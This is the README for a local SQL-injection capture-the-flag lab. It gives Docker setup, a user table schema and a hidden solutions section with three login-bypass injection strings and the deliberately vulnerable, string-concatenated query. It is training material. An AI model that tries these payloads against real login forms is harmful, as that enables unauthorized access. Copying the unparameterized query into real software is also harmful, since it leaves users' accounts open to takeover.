# SQL Injection Authentication Bypass CTF Challenge

## Project Structure
```
sql-injection-ctf/
├── Dockerfile
├── docker-compose.yml
├── init.sql
├── index.php
├── login.php
├── dashboard.php
├── logout.php
└── README.md
```

## Quick Start

1. Clone this repository:
```bash
git clone [repository-url]
cd sql-injection-ctf
```

2. Start the containers:
```bash
docker-compose up --build
```

3. Access the challenge:
- Open your web browser
- Navigate to `http://localhost:8000`

## Challenge Details

### Objective
Your goal is to bypass the authentication system and gain access to the admin account to retrieve the flag.

### Default Credentials (Don't use these!)
- Username: test
- Password: test

### Database Structure
```sql
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(50) NOT NULL,
    flag VARCHAR(100)
);
```

## Solutions

<details>
<summary>Click to reveal solutions (Try solving it first!)</summary>

There are multiple ways to solve this challenge:

1. Basic SQL Injection:
   ```sql
   Username: admin' OR '1'='1' --
   Password: anything
   ```

2. Simpler version:
   ```sql
   Username: admin' --
   Password: anything
   ```

3. Alternative method:
   ```sql
   Username: admin' or '1'='1
   Password: anything
   ```

The vulnerable query:
```sql
SELECT * FROM users WHERE username='$username' AND password='$password'
```
</details>

